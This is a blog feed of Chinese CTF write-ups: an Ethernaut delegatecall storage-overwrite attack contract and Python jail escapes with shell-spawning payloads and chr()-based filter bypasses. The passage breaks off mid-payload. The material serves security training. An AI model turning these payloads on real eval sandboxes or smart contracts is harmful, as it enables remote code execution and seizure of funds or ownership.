<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>Delegatecall</title>
    <link href="/2023/10/26/Delegatecall/"/>
    <url>/2023/10/26/Delegatecall/</url>
    
    <content type="html"><![CDATA[<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><h4 id="三种调用函数"><a href="#三种调用函数" class="headerlink" title="三种调用函数"></a>三种调用函数</h4><p>在 Solidity 中，call 函数簇可以实现跨合约的函数调用功能，其中包括 call、delegatecall 和 callcode 三种方式。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs solidity">&lt;address&gt;.call(...) returns (bool)<br>&lt;address&gt;.callcode(...) returns (bool)<br>&lt;address&gt;.delegatecall(...) returns (bool)<br><br></code></pre></td></tr></table></figure><p>中的内置变量 <code>msg</code> 会随着调用的发起而改变，<code>msg</code> 保存了调用方的信息包括：调用发起的地址，交易金额，被调用函数字符序列等。</p><h5 id="异同点"><a href="#异同点" class="headerlink" title="异同点"></a>异同点</h5><p>call ：调用后会将msg的值修改为调用者，执行环境为被调用的运行环境</p><p>delegatecall: 调用后内置变量 <code>msg</code> 的值不会修改为调用者，但执行环境为调用者的运行环境（相当于复制被调用者的代码到调用者合约）</p><p>callcode: 调用后内置变量 <code>msg</code> 的值会修改为调用者，但执行环境为调用者的运行环境</p><h3 id="delegatecall的滥用"><a href="#delegatecall的滥用" class="headerlink" title="delegatecall的滥用"></a>delegatecall的滥用</h3><h4 id="威胁分析"><a href="#威胁分析" class="headerlink" title="威胁分析"></a>威胁分析</h4><p>delegatecall 调用有 <code>address</code> 和 <code>msg.data</code> 两个参数</p><p> 若 <code>msg.data</code> 可控，则可调用 <code>address</code> 处任意函数</p><h4 id="原因分析"><a href="#原因分析" class="headerlink" title="原因分析"></a>原因分析</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.4.23;<br><br>contract A &#123;<br>    address public c;<br>    address public b;<br><br>    function test() public returns (address a) &#123;<br>        a = address(this);<br>        b = a;<br>    &#125;<br>&#125;<br><br>contract B &#123;<br>    address public b;<br>    address public c;<br><br>    function withdelegatecall(address testaddress) public &#123;<br>        testaddress.delegatecall(bytes4(keccak256(&quot;test()&quot;)));<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>当部署两个合约后，使用外部账户调用withdelegatecall函数。</p><p>A合约中，c&#x3D;0；b&#x3D;0；</p><p>B合约中，b&#x3D;0；c&#x3D;address (A)</p><p>事实上调用 delegatecall 来使用 Storage 变量时依据并不是变量名，而是变量的存储位，这样的话我们就可以达到覆盖相关变量的目的。</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="ethernaut-第-16-题"><a href="#ethernaut-第-16-题" class="headerlink" title="ethernaut 第 16 题"></a><a href="https://ethernaut.openzeppelin.com/">ethernaut</a> 第 16 题</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h5 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h5><p>要想改变owner，只有constructor函数，但是有delegatecall漏洞。</p><p>setFirstTime(uint _timeStamp) </p><p>setSecondTime(uint _timeStamp)</p><p>这两个函数是调用setTime函数。也就是说，当我们第一次调用setFirstTime函数时，就会设置solt0为攻击合约的地址，第二次调用该函数时就会调用该合约的函数即，改变的是solt2。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity ^0.8.0;<br><br>contract Preservation &#123;<br><br>  // public library contracts <br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  // Sets the function signature for delegatecall<br>  bytes4 constant setTimeSignature = bytes4(keccak256(&quot;setTime(uint256)&quot;));<br><br>  constructor(address _timeZone1LibraryAddress, address _timeZone2LibraryAddress) public &#123;<br>    timeZone1Library = _timeZone1LibraryAddress; <br>    timeZone2Library = _timeZone2LibraryAddress; <br>    owner = msg.sender;<br>  &#125;<br><br>  // set the time for timezone 1<br>  function setFirstTime(uint _timeStamp) public &#123;<br>    timeZone1Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br><br>  // set the time for timezone 2<br>  function setSecondTime(uint _timeStamp) public &#123;<br>    timeZone2Library.delegatecall(setTimeSignature, _timeStamp);<br>  &#125;<br>&#125;<br><br>// Simple library contract to set the time<br>contract LibraryContract &#123;<br><br>  // stores a timestamp <br>  uint storedTime;  <br><br>  function setTime(uint _time) public &#123;<br>    storedTime = _time;<br>  &#125;<br>&#125;<br><br>contract Attack &#123;<br>  address public timeZone1Library;<br>  address public timeZone2Library;<br>  address public owner; <br>  uint storedTime;<br>  Preservation public target; // target Preservation contract<br><br>  constructor(address _target) public &#123;<br>    target = Preservation(_target);<br>  &#125;<br><br>  function attack1() public &#123;<br>    target.setFirstTime(uint256(uint160(address(this))));<br>    target.setFirstTime(uint256(uint160(msg.sender)));<br>  &#125;<br><br>  // overwrite the library addresses and owner address<br>  function setTime(uint _time) public &#123;<br>   owner=address(uint160(_time));<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用attack1().</p>]]></content>
    
    
    <categories>
      
      <category>Blockchain</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Pyjail（上）</title>
    <link href="/2023/10/25/Pyjail%E4%B8%8A/"/>
    <url>/2023/10/25/Pyjail%E4%B8%8A/</url>
    
    <content type="html"><![CDATA[<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p>[<a href="https://zhuanlan.zhihu.com/p/578966149">PyJail] python沙箱逃逸探究·总览（HNCTF题解） - 知乎 (zhihu.com)</a></p><p><a href="http://lihuaxi.xjx100.cn/news/1475226.html?action=onClick">Python Jail 沙盒逃逸 合集 (xjx100.cn)</a></p><h3 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a>魔术方法</h3><ul><li><ul><li><code>__init__</code>：构造函数。这个在实例化类的时候就会用到，一般是接受类初始化的参数，并且进行一系列初始化操作。</li><li><code>__len__</code>：返回对象的长度。对一个对象<code>a</code>使用<code>len(a)</code>时，会尝试调用<code>a.__len__()</code>。这个做炼丹的同学应该很熟悉，例如要通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法；</li><li><code>__str__</code>：返回对象的字符串表示。对一个对象<code>a</code>使用<code>str(a)</code>时，会尝试调用<code>a.__str__()</code>。这在我们自己实现一些类，譬如复数、二叉树、有限域、椭圆曲线等时，通过实现该方法，能将对象的内容较好地打印出来。（<code>print</code>函数中也会自动调用对象的<code>__str__</code>方法）相似地，还有<code>__int__</code>魔术方法也用于类型转换，不过较少使用；</li><li><code>__getitem__</code>：根据索引返回对象的某个元素。对一个对象<code>a</code>使用<code>a[1]</code>时，会尝试调用<code>a.__getitem__(1)</code>。同样，当我们通过继承<code>torch.utils.data.Dataset</code>来实现自己的数据集时，就需要实现这个方法。有<code>__getitem__</code>，自然也有对应的<code>__setitem__</code>；</li><li><code>__add__</code>、<code>__sub__</code>、<code>__mul__</code>、<code>__div__</code>、<code>__mod__</code>：算术运算，加减乘除模。如对一个对象<code>a</code>使用<code>a+b</code>时，会尝试调用<code>a.__add__(b)</code>。相应地，对于有些运算，对象需放在后面（第二个操作数）的，则需实现<code>__radd__</code>、<code>__rsub__</code>、<code>__rmul__</code>、<code>__rdiv__</code>、<code>__rmod__</code>，如椭圆曲线上的点的倍点运算<code>G -&gt; d * G</code>，就可以通过实现<code>__rmul__</code>来实现。</li><li><code>__and__</code>，<code>__or__</code>、<code>__xor__</code>：逻辑运算，和算术运算类似；</li><li><code>__eq__</code>，<code>__ne__</code>、<code>__lt__</code>、<code>__gt__</code>、<code>__le__</code>、<code>__ge__</code>：比较运算，和算术运算类似；例如<code>&#39;贵州&#39; &gt; &#39;广西&#39;</code>，就会转而调用<code>&#39;贵州&#39;.__gt__(&#39;广西&#39;)</code>；</li><li><code>__getattr__</code>：对象是否含有某属性。如果我们对对象<code>a</code>所对应的类实现了该方法，那么在调用未实现的<code>a.b</code>时，就会转而调用<code>a.__getattr__(b)</code>。这也等价于用函数的方法调用：<code>getattr(a, &#39;b&#39;)</code>。有<code>__getattr__</code>，自然也有对应的<code>__setattr__</code>；</li><li><code>__subclasses__</code>：返回当前类的所有子类。一般是用在<code>object</code>类中，在<code>object.__subclasses__()</code>中，我们可以找到<code>os</code>模块中的类，然后再找到<code>os</code>，并且执行<code>os.system</code>，实现RCE。</li></ul></li><li><code>dir</code>：查看对象的所有属性和方法。在我们没有思路的时候，可以通过该函数查看所有可以利用的方法；此外，在题目禁用引号以及小数点时，也可以先用拿到类所有可用方法，再索引到方法名，并且通过<code>getattr</code>来拿到目标方法。</li><li><code>chr</code>、<code>ord</code>：字符与ASCII码转换函数，能帮我们绕过一些WAF</li><li><code>globals</code>：返回所有全局变量的函数；</li><li><code>locals</code>：返回所有局部变量的函数；</li><li><code>__import__</code>：载入模块的函数。例如<code>import os</code>等价于<code>os = __import__(&#39;os&#39;)</code>；</li><li><code>__name__</code>：该变量指示当前运行环境位于哪个模块中。如我们python一般写的<code>if __name__ == &#39;__main__&#39;:</code>，就是来判断是否是直接运行该脚本。如果是从另外的地方import的该脚本的话，那<code>__name__</code>就不为<code>__main__</code>，就不会执行之后的代码。更多参考<a href="https://link.zhihu.com/?target=https://www.geeksforgeeks.org/__name__-a-special-variable-in-python/">这里</a>；</li><li><code>__builtins__</code>：包含当前运行环境中默认的所有函数与类。如上面所介绍的所有默认函数，如<code>str</code>、<code>chr</code>、<code>ord</code>、<code>dict</code>、<code>dir</code>等。在pyjail的沙箱中，往往<code>__builtins__</code>被置为<code>None</code>，因此我们不能利用上述的函数。所以一种思路就是我们可以先通过类的基类和子类拿到<code>__builtins__</code>，再<code>__import__(&#39;os&#39;).system(&#39;sh&#39;)</code>进行RCE；</li><li><code>__file__</code>：该变量指示当前运行代码所在路径。如<code>open(__file__).read()</code>就是读取当前运行的python文件代码。需要注意的是，<strong>该变量仅在运行代码文件时会产生，在运行交互式终端时不会有此变量</strong>；</li><li><code>_</code>：该变量返回上一次运行的python语句结果。需要注意的是，<strong>该变量仅在运行交互式终端时会产生，在运行代码文件时不会有此变量</strong>。</li></ul><p><strong>breakpoint 函数</strong></p><p>breakpoint()是3.7以后引入的内置函数，可以用于断点调试</p><p>pdb 模块定义了一个交互式源代码调试器，用于 Python 程序。它支持在源码行间设置（有条件的）断点和单步执行，检视堆栈帧，列出源码列表，以及在任何堆栈帧的上下文中运行任意 Python 代码。它还支持事后调试，可以在程序控制下调用。</p><p>在输入 breakpoint() 后可以代开 Pdb 代码调试器，在其中就可以执行任意 python 代码</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>优先考虑RCE起手式一种是 os.system(‘sh’)进入交互终端，另一种是os.popen(‘ls’).read()</p><p>object.<strong>subclasses</strong>()<code>中找到</code>os<code>模块中的类（一般是</code>&lt;class ‘os._wrap_close’&gt;<code>），另一种是先拿到</code><strong>builtins</strong><code>，再</code><strong>import</strong>(‘os’).system(‘sh’)</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><h4 id="calc-jail-beginner"><a href="#calc-jail-beginner" class="headerlink" title="calc_jail_beginner"></a>calc_jail_beginner</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#Your goal is to read ./flag.txt</span><br><span class="hljs-comment">#You can use these payload liked `__import__(&#x27;os&#x27;).system(&#x27;cat ./flag.txt&#x27;)` or `print(open(&#x27;/flag.txt&#x27;).read())`</span><br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _     ______      _                              _       _ _ </span><br><span class="hljs-string"> | |   |  ____|    (_)                            | |     (_) |</span><br><span class="hljs-string"> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |</span><br><span class="hljs-string"> | &#x27;_ \|  __| / _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|  _   | |/ _` | | |</span><br><span class="hljs-string"> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |</span><br><span class="hljs-string"> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|</span><br><span class="hljs-string">               __/ |                                           </span><br><span class="hljs-string">              |___/                                            </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>可以根据提示构建payload得到flag</p><p>也可以get交互式shell</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs py">nc node5.anna.nssctf.cn <span class="hljs-number">28782</span><br><br>  _     ______      _                              _       _ _<br> | |   |  ____|    (_)                            | |     (_) |<br> | |__ | |__   __ _ _ _ __  _ __   ___ _ __       | | __ _ _| |<br> | <span class="hljs-string">&#x27;_ \|  __| / _` | | &#x27;</span>_ \| <span class="hljs-string">&#x27;_ \ / _ \ &#x27;</span>__|  _   | |/ _` | | |<br> | |_) | |___| (_| | | | | | | | |  __/ |    | |__| | (_| | | |<br> |_.__/|______\__, |_|_| |_|_| |_|\___|_|     \____/ \__,_|_|_|<br>               __/ |<br>              |___/<br><br>Welcome to the python jail<br>Let<span class="hljs-string">&#x27;s have an beginner jail of calc</span><br><span class="hljs-string">Enter your expression and I will evaluate it for you.</span><br><span class="hljs-string">&gt;  __import__(&#x27;</span>os<span class="hljs-string">&#x27;).system(&#x27;</span>sh<span class="hljs-string">&#x27;)</span><br><span class="hljs-string">sh: 0: can&#x27;</span>t access tty; job control turned off<br>$ ls<br>flag  server.py<br>$ cat flag<br>flag=NSSCTF&#123;fb867efc-bcf4-4f2b-b340-41ee9ad4a5e8&#125;<br></code></pre></td></tr></table></figure><h4 id="calc-jail-beginner-level1"><a href="#calc-jail-beginner-level1" class="headerlink" title="calc_jail_beginner_level1"></a>calc_jail_beginner_level1</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-comment">#the function of filter will banned some string &#x27;,&quot;,i,b</span><br><span class="hljs-comment">#it seems banned some payload </span><br><span class="hljs-comment">#Can u escape it?Good luck!</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">filter</span>(<span class="hljs-params">s</span>):<br>    not_allowed = <span class="hljs-built_in">set</span>(<span class="hljs-string">&#x27;&quot;\&#x27;`ib&#x27;</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">any</span>(c <span class="hljs-keyword">in</span> not_allowed <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s)<br><br>WELCOME = <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">  _                _                           _       _ _   _                _ __ </span><br><span class="hljs-string"> | |              (_)                         (_)     (_) | | |              | /_ |</span><br><span class="hljs-string"> | |__   ___  __ _ _ _ __  _ __   ___ _ __     _  __ _ _| | | | _____   _____| || |</span><br><span class="hljs-string"> | &#x27;_ \ / _ \/ _` | | &#x27;_ \| &#x27;_ \ / _ \ &#x27;__|   | |/ _` | | | | |/ _ \ \ / / _ \ || |</span><br><span class="hljs-string"> | |_) |  __/ (_| | | | | | | | |  __/ |      | | (_| | | | | |  __/\ V /  __/ || |</span><br><span class="hljs-string"> |_.__/ \___|\__, |_|_| |_|_| |_|\___|_|      | |\__,_|_|_| |_|\___| \_/ \___|_||_|</span><br><span class="hljs-string">              __/ |                          _/ |                                  </span><br><span class="hljs-string">             |___/                          |__/                                                                                      </span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(WELCOME)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Welcome to the python jail&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Let&#x27;s have an beginner jail of calc&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Enter your expression and I will evaluate it for you.&quot;</span>)<br>input_data = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt; &quot;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">filter</span>(input_data):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Oh hacker!&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Answer: &#123;&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">eval</span>(input_data)))<br><br></code></pre></td></tr></table></figure><p>也就是说，我们能通过<code>eval</code>执行任意命令，但是命令不能包含双引号、单引号、反引号、字母<code>i</code>和字母<code>b</code>。许多命令，如<code>import</code>、<code>__builtins__</code>、<code>bytes</code>都无法用。</p><p>Show subclasses with tuple开始</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()<br></code></pre></td></tr></table></figure><p>b用不了，因此想到getattr()</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(().__class__, <span class="hljs-string">&#x27;__base__&#x27;</span>).__subclasses__()<br></code></pre></td></tr></table></figure><p>但是引号都被banl，可以使用chr函数</p><p>‘<strong>base</strong>‘</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)<br></code></pre></td></tr></table></figure><p><strong>subclasses</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))<br></code></pre></td></tr></table></figure><p>绕过WAF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(().__class__,<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))()<br></code></pre></td></tr></table></figure><p>找到os 在 ().<strong>class</strong>.<strong>base</strong>.<strong>subclasses</strong>()[-4].<strong>init</strong>.<strong>globals</strong><a href="'sh'">‘system’</a></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py">().__class__.__base__.__subclasses__()[-<span class="hljs-number">4</span>].__init__.__globals__[<span class="hljs-string">&#x27;system&#x27;</span>](<span class="hljs-string">&#x27;sh&#x27;</span>)<br></code></pre></td></tr></table></figure><p>绕过WAF</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(<span class="hljs-built_in">getattr</span>(().__class__,<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)),<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">117</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">98</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">99</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">108</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">97</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">101</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">115</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>))()[-<span class="hljs-number">4</span>],<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">95</span>)+<span class="hljs-built_in">chr</span>(<span class="hljs-number">105</span>)+<span class="hljs-built_in">chr</span>(<span 